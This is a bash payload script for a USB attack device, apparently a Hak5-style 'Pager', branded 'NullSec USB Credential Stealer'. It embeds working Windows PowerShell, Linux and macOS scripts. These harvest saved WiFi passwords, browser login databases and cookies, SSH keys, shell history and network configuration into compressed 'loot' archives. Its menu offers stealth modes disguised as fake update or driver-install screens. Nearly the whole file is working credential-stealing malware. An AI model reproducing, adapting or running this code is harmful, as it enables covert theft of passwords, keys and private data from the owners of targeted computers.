#!/bin/bash
#═══════════════════════════════════════════════════════════════════════════════
# NullSec USB Credential Stealer
# Developed by: bad-antics
# 
# PineAP Feature: Automatically harvests credentials when plugged into USB
# Grabs WiFi passwords, browser creds, system info from Windows/Linux/Mac
#═══════════════════════════════════════════════════════════════════════════════

LOOT_DIR="/mmc/nullsec/usb_loot"
CONFIG_FILE="/mmc/nullsec/usb_stealer.conf"
TRIGGER_FILE="/tmp/usb_stealer_active"
LOG_FILE="/mmc/nullsec/usb_stealer.log"

# Initialize
mkdir -p "$LOOT_DIR"

log_action() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> "$LOG_FILE"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" >> "$LOG_FILE"
    echo "NullSec USB Credential Stealer" >> "$LOG_FILE"
    echo "Developed by: bad-antics" >> "$LOG_FILE"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" >> "$LOG_FILE"
}

PROMPT "USB CREDENTIAL STEALER
━━━━━━━━━━━━━━━━━━━━━━━━━
PineAP USB Attack Module

When enabled, the Pager
will harvest credentials
when plugged into a target
computer via USB.

Captures:
• WiFi passwords
• Browser credentials
• System information
• Network configs
• User data

━━━━━━━━━━━━━━━━━━━━━━━━━
Developed by: bad-antics
Press OK to continue."

PROMPT "OPTIONS:

1. Enable USB Stealer
2. Disable USB Stealer
3. View Captured Loot
4. Configure Targets
5. Manual Harvest
6. Clear All Loot

Select option next."

MODE=$(NUMBER_PICKER "Mode (1-6):" 1)

case $MODE in
    1) # Enable
        PROMPT "ENABLE USB STEALER

Select target OS:

1. Windows Only
2. Linux Only
3. macOS Only
4. All Systems (Auto)

Select next."
        
        TARGET_OS=$(NUMBER_PICKER "Target (1-4):" 4)
        
        case $TARGET_OS in
            1) OS_TARGET="windows" ;;
            2) OS_TARGET="linux" ;;
            3) OS_TARGET="macos" ;;
            4) OS_TARGET="all" ;;
        esac
        
        PROMPT "STEALTH OPTIONS:

1. Silent (No UI)
2. Fake Update Screen
3. Fake Driver Install
4. Quick & Exit

Select method."
        
        STEALTH=$(NUMBER_PICKER "Stealth (1-4):" 1)
        
        # Save config
        cat > "$CONFIG_FILE" << CONFIG_EOF
# NullSec USB Stealer Config
# Developed by: bad-antics
ENABLED=true
TARGET_OS=$OS_TARGET
STEALTH_MODE=$STEALTH
AUTO_EXFIL=true
LOOT_DIR=$LOOT_DIR
CONFIG_EOF
        
        # Create the trigger
        touch "$TRIGGER_FILE"
        
        # Create USB gadget scripts
        mkdir -p /mmc/nullsec/usb_scripts
        
        # Windows harvest script (PowerShell)
        cat > /mmc/nullsec/usb_scripts/harvest_windows.ps1 << 'WINSCRIPT'
# NullSec Windows Credential Harvester
# Developed by: bad-antics

$outDir = "$env:TEMP\nullsec_harvest"
New-Item -ItemType Directory -Force -Path $outDir | Out-Null

# System Info
$sysInfo = @"
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
NullSec USB Credential Stealer
Developed by: bad-antics
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Hostname: $env:COMPUTERNAME
Username: $env:USERNAME
Domain: $env:USERDOMAIN
OS: $(Get-WmiObject -Class Win32_OperatingSystem | Select-Object -ExpandProperty Caption)
Architecture: $env:PROCESSOR_ARCHITECTURE
Time: $(Get-Date)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"@
$sysInfo | Out-File "$outDir\system_info.txt"

# WiFi Passwords
$wifiProfiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { ($_ -split ":")[1].Trim() }
$wifiData = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`nNullSec WiFi Password Harvester`nDeveloped by: bad-antics`n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`n"
foreach ($profile in $wifiProfiles) {
    $password = netsh wlan show profile name="$profile" key=clear | Select-String "Key Content" | ForEach-Object { ($_ -split ":")[1].Trim() }
    if ($password) {
        $wifiData += "SSID: $profile`nPassword: $password`n---`n"
    }
}
$wifiData | Out-File "$outDir\wifi_passwords.txt"

# Browser Passwords (Chrome)
$chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
if (Test-Path $chromePath) {
    Copy-Item $chromePath "$outDir\chrome_logins.db" -Force 2>$null
}

# Network Info
ipconfig /all | Out-File "$outDir\network_config.txt"
netstat -an | Out-File "$outDir\network_connections.txt"
arp -a | Out-File "$outDir\arp_table.txt"

# Recent files
Get-ChildItem "$env:USERPROFILE\Downloads" -Recurse -File | Select-Object Name, FullName, LastWriteTime | Out-File "$outDir\recent_downloads.txt"

# Compress and prepare for exfil
Compress-Archive -Path "$outDir\*" -DestinationPath "$outDir\loot.zip" -Force

# Output location for USB copy
Write-Output $outDir
WINSCRIPT

        # Linux harvest script
        cat > /mmc/nullsec/usb_scripts/harvest_linux.sh << 'LINUXSCRIPT'
#!/bin/bash
# NullSec Linux Credential Harvester
# Developed by: bad-antics

OUTDIR="/tmp/nullsec_harvest_$$"
mkdir -p "$OUTDIR"

cat > "$OUTDIR/system_info.txt" << SYSINFO
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
NullSec USB Credential Stealer
Developed by: bad-antics
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Hostname: $(hostname)
Username: $(whoami)
OS: $(cat /etc/os-release 2>/dev/null | grep PRETTY_NAME | cut -d'"' -f2)
Kernel: $(uname -r)
Time: $(date)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
SYSINFO

# WiFi Passwords
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" > "$OUTDIR/wifi_passwords.txt"
echo "NullSec WiFi Password Harvester" >> "$OUTDIR/wifi_passwords.txt"
echo "Developed by: bad-antics" >> "$OUTDIR/wifi_passwords.txt"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" >> "$OUTDIR/wifi_passwords.txt"

# NetworkManager
for conn in /etc/NetworkManager/system-connections/*; do
    if [ -f "$conn" ]; then
        SSID=$(grep "^ssid=" "$conn" 2>/dev/null | cut -d'=' -f2)
        PSK=$(grep "^psk=" "$conn" 2>/dev/null | cut -d'=' -f2)
        if [ -n "$SSID" ] && [ -n "$PSK" ]; then
            echo "SSID: $SSID" >> "$OUTDIR/wifi_passwords.txt"
            echo "Password: $PSK" >> "$OUTDIR/wifi_passwords.txt"
            echo "---" >> "$OUTDIR/wifi_passwords.txt"
        fi
    fi
done

# wpa_supplicant
if [ -f /etc/wpa_supplicant/wpa_supplicant.conf ]; then
    grep -A5 "network=" /etc/wpa_supplicant/wpa_supplicant.conf >> "$OUTDIR/wifi_passwords.txt"
fi

# Network info
ip addr > "$OUTDIR/network_config.txt" 2>/dev/null
netstat -tuln > "$OUTDIR/network_connections.txt" 2>/dev/null
arp -a > "$OUTDIR/arp_table.txt" 2>/dev/null

# SSH keys
if [ -d ~/.ssh ]; then
    cp -r ~/.ssh "$OUTDIR/ssh_keys" 2>/dev/null
fi

# Browser data
for browser in .mozilla/firefox .config/chromium .config/google-chrome; do
    if [ -d ~/"$browser" ]; then
        find ~/"$browser" -name "logins.json" -o -name "Login Data" 2>/dev/null | head -5 | while read f; do
            cp "$f" "$OUTDIR/" 2>/dev/null
        done
    fi
done

# History
cat ~/.bash_history > "$OUTDIR/bash_history.txt" 2>/dev/null
cat ~/.zsh_history > "$OUTDIR/zsh_history.txt" 2>/dev/null

# Compress
tar czf "$OUTDIR/loot.tar.gz" -C "$OUTDIR" . 2>/dev/null

echo "$OUTDIR"
LINUXSCRIPT

        # macOS harvest script  
        cat > /mmc/nullsec/usb_scripts/harvest_macos.sh << 'MACSCRIPT'
#!/bin/bash
# NullSec macOS Credential Harvester
# Developed by: bad-antics

OUTDIR="/tmp/nullsec_harvest_$$"
mkdir -p "$OUTDIR"

cat > "$OUTDIR/system_info.txt" << SYSINFO
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
NullSec USB Credential Stealer
Developed by: bad-antics
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Hostname: $(hostname)
Username: $(whoami)
OS: $(sw_vers -productName) $(sw_vers -productVersion)
Time: $(date)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
SYSINFO

# WiFi - requires admin but try anyway
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" > "$OUTDIR/wifi_passwords.txt"
echo "NullSec WiFi Password Harvester" >> "$OUTDIR/wifi_passwords.txt"
echo "Developed by: bad-antics" >> "$OUTDIR/wifi_passwords.txt"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" >> "$OUTDIR/wifi_passwords.txt"

# Get current WiFi
CURRENT_WIFI=$(/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -I | grep " SSID" | cut -d: -f2 | tr -d ' ')
echo "Current WiFi: $CURRENT_WIFI" >> "$OUTDIR/wifi_passwords.txt"

# Network info
ifconfig > "$OUTDIR/network_config.txt" 2>/dev/null
netstat -an > "$OUTDIR/network_connections.txt" 2>/dev/null
arp -a > "$OUTDIR/arp_table.txt" 2>/dev/null

# SSH keys
if [ -d ~/.ssh ]; then
    cp -r ~/.ssh "$OUTDIR/ssh_keys" 2>/dev/null
fi

# Browser cookies/data locations
find ~/Library/Application\ Support/Google/Chrome -name "Cookies" -o -name "Login Data" 2>/dev/null | head -5 | while read f; do
    cp "$f" "$OUTDIR/" 2>/dev/null
done

# History
cat ~/.bash_history > "$OUTDIR/bash_history.txt" 2>/dev/null
cat ~/.zsh_history > "$OUTDIR/zsh_history.txt" 2>/dev/null

# Compress
tar czf "$OUTDIR/loot.tar.gz" -C "$OUTDIR" . 2>/dev/null

echo "$OUTDIR"
MACSCRIPT

        chmod +x /mmc/nullsec/usb_scripts/*.sh
        
        log_action "USB Stealer ENABLED - Target: $OS_TARGET, Stealth: $STEALTH"
        
        PROMPT "USB STEALER ENABLED!
━━━━━━━━━━━━━━━━━━━━━━━━━
Target OS: $OS_TARGET
Stealth Mode: $STEALTH

The Pager will now
automatically harvest
credentials when plugged
into a target computer.

Loot saves to:
$LOOT_DIR/

━━━━━━━━━━━━━━━━━━━━━━━━━
Developed by: bad-antics
Press OK to exit."
        ;;
        
    2) # Disable
        rm -f "$TRIGGER_FILE"
        sed -i 's/ENABLED=true/ENABLED=false/' "$CONFIG_FILE" 2>/dev/null
        
        log_action "USB Stealer DISABLED"
        
        PROMPT "USB STEALER DISABLED

Automatic credential
harvesting is now OFF.

━━━━━━━━━━━━━━━━━━━━━━━━━
Developed by: bad-antics
Press OK to exit."
        ;;
        
    3) # View Loot
        LOOT_COUNT=$(find "$LOOT_DIR" -type f 2>/dev/null | wc -l)
        LOOT_SIZE=$(du -sh "$LOOT_DIR" 2>/dev/null | cut -f1)
        
        LOOT_LIST=$(ls -lt "$LOOT_DIR" 2>/dev/null | head -10 | awk '{print $9}')
        
        PROMPT "CAPTURED LOOT
━━━━━━━━━━━━━━━━━━━━━━━━━
Total Files: $LOOT_COUNT
Total Size: $LOOT_SIZE

Recent Captures:
$LOOT_LIST

Location: $LOOT_DIR/

━━━━━━━━━━━━━━━━━━━━━━━━━
Developed by: bad-antics
Press OK to exit."
        ;;
        
    4) # Configure
        PROMPT "CONFIGURE TARGETS

1. Grab WiFi passwords
2. Grab browser data
3. Grab SSH keys
4. Grab system info
5. Grab network config
6. ALL (default)

Select what to capture."
        
        TARGETS=$(NUMBER_PICKER "Targets (1-6):" 6)
        
        echo "CAPTURE_TARGETS=$TARGETS" >> "$CONFIG_FILE"
        
        PROMPT "Configuration saved!

━━━━━━━━━━━━━━━━━━━━━━━━━
Developed by: bad-antics
Press OK to exit."
        ;;
        
    5) # Manual Harvest
        PROMPT "MANUAL HARVEST

This will attempt to
harvest credentials from
the currently connected
host (if any).

Press OK to start."
        
        SPINNER_START "Harvesting..."
        
        # Create timestamped loot folder
        HARVEST_DIR="$LOOT_DIR/manual_$(date +%Y%m%d_%H%M%S)"
        mkdir -p "$HARVEST_DIR"
        
        # Try to detect connected host
        # This would need USB gadget mode active
        
        sleep 3
        SPINNER_STOP
        
        PROMPT "Manual harvest attempted.

Check $HARVEST_DIR
for any captured data.

━━━━━━━━━━━━━━━━━━━━━━━━━
Developed by: bad-antics
Press OK to exit."
        ;;
        
    6) # Clear Loot
        resp=$(CONFIRMATION_DIALOG "CLEAR ALL LOOT?

This will permanently
delete all captured
credentials and data.

This cannot be undone!

Confirm?")
        
        if [ "$resp" = "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
            rm -rf "$LOOT_DIR"/*
            log_action "All loot cleared"
            
            PROMPT "All loot cleared!

━━━━━━━━━━━━━━━━━━━━━━━━━
Developed by: bad-antics
Press OK to exit."
        fi
        ;;
esac
